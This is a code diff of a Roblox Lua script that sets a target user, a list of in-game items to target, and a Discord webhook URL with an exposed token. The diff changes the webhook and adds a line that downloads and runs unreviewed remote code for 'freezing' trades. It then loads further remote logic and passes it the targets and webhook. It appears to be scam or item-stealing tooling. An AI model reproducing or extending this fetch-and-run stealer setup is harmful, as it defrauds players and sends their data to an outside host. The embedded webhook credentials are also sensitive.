@@ -1,6 +1,6 @@
 local TARGET_ID = 12009330786
 local TARGET_USER = "fahd8799isuncle"
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1572034487846436954/D8eWO9pgZt6G1lmdVVOEF4tDPnIdu3Nv3QL1RhSKO3AS4CvGPD3AUeHFTxfzh6sAaMQi"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1572042953566855188/N9lWIiYoSbSI5aO4PHZxTtuhuvoopAKNGUgoy6N5rD4wAlGNJFGqGZ4zJKk_TpgZb-F5"
 
 local TargetBrainrots = {
     ["Phoenix"] = true,
@@ -127,6 +127,10 @@ task.spawn(function()
 end)
 
 task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/FREEZE_TRADE/refs/heads/main/.lua"))()
+
+    task.wait(1)
+
     local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
     if type(script) == "function" then
         script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
